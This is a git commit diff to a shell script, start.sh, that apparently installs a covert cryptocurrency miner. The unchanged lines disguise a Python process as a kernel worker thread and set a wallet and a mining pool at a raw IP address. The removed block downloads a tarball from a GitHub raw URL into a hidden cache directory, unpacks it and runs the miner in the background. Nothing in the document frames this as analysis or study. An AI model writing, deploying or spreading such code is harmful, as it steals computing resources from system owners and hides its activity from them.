ab6d8f438da38e2dd6b776076849c9ae35831087
ewilkinso <ewilkinson3@alaska.edu>
2025-08-14 08:22:11 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,26 +3,7 @@
 nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
 
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="arm-100"
-POOL="45.155.102.89:443"
-THREADS=1
-
-WORKDIR="$HOME/.cache/.sysd"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
-
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
-
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-#!/bin/bash
-
-nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
-
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="arm-10"
+WORKER="arm"
 POOL="45.155.102.89:443"
 THREADS=1
 
